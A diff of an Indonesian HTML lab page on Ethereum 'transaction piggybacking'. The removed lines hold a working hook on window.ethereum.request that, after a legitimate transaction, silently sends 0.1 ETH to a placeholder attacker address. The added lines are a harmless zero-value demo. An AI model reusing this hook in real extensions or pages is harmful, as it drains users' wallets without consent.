@@ -2,65 +2,49 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Analisis Serangan: Transaction Piggybacking</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uji Coba Transaksi Piggybacking</title>
 </head>
 <body>
-    <h1>Lab Analisis: Hooking eth_sendTransaction</h1>
-    <button id="btn-legit">Jalankan Transaksi DApp (Sah)</button>
-    <p>Status: <span id="status">Siap</span></p>
+    <h1>Uji Coba: Transaction Piggyback</h1>
+    <button id="btn-run" style="padding: 20px; font-size: 18px;">Kirim Transaksi & Piggyback</button>
+    <p id="status">Status: Standby</p>
 
     <script>
-        // 1. MENGAMBIL FUNGSI ASLI
-        // Dalam ekstensi nyata, ini dilakukan di 'document_start' 
-        // sebelum dApp sempat memanggilnya.
-        const originalRequest = window.ethereum.request;
+        const btn = document.getElementById('btn-run');
+        const status = document.getElementById('status');
 
-        // 2. MELAKUKAN HOOKING / MONKEY-PATCHING
-        // Kita mengganti fungsi asli dengan fungsi berbahaya milik kita
-        window.ethereum.request = async function(args) {
+        btn.addEventListener('click', async () => {
+            status.innerText = "Mengirim Transaksi Sah...";
             
-            // Intersepsi: Jika dApp meminta kirim transaksi
-            if (args.method === 'eth_sendTransaction') {
-                console.log("Terdeteksi upaya transaksi sah:", args);
-
-                // Eksekusi transaksi asli terlebih dahulu agar tidak terdeteksi
-                const result = await originalRequest.apply(this, arguments);
-
-                // INJEKSI: Menambahkan transaksi kedua (Piggybacking)
-                // Ini terjadi tepat setelah transaksi pertama berhasil/dieksekusi
-                console.warn("Melakukan injeksi transaksi piggyback...");
-                
-                originalRequest.call(this, {
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        to: '0xTargetPenyerang', // Alamat penyerang
-                        value: '0x16345785D8A0000', // Contoh: 0.1 ETH
-                        data: '0x' // Bisa diisi data kontrak berbahaya
-                    }]
-                }).catch(err => console.error("Injeksi gagal:", err));
-
-                return result;
-            }
-
-            // Untuk metode lain, teruskan seperti biasa
-            return originalRequest.apply(this, arguments);
-        };
-
-        // --- Simulasi Penggunaan dApp ---
-        document.getElementById('btn-legit').addEventListener('click', async () => {
-            document.getElementById('status').innerText = "Memulai transaksi...";
-            
+            // 1. Kirim transaksi sah
             try {
-                await window.ethereum.request({
+                const tx1 = await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        to: '0xPenerimaSah',
-                        value: '0xDE0B6B3A7640000'
-                    }]
+                        to: '0x000000000000000000000000000000000000dEaD', // Alamat uji
+                        value: '0x0', 
+                    }],
                 });
-                document.getElementById('status').innerText = "Transaksi sah terkirim.";
+                status.innerText = "Transaksi 1 dikirim: " + tx1;
+
+                // 2. Skenario Piggyback (Injeksi segera setelah transaksi 1 dipicu)
+                // Di dApp browser, ini meniru perilaku ekstensi yang "menyambar" 
+                // antrean sesaat setelah dApp meminta izin.
+                setTimeout(async () => {
+                    status.innerText = "Melakukan Piggyback...";
+                    await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            to: '0x000000000000000000000000000000000000dEaD',
+                            value: '0x0',
+                        }],
+                    });
+                    status.innerText = "Transaksi 2 (Piggyback) terkirim.";
+                }, 500);
+
             } catch (err) {
-                document.getElementById('status').innerText = "Dibatalkan.";
+                status.innerText = "Error/Dibatalkan: " + err.message;
             }
         });
     </script>
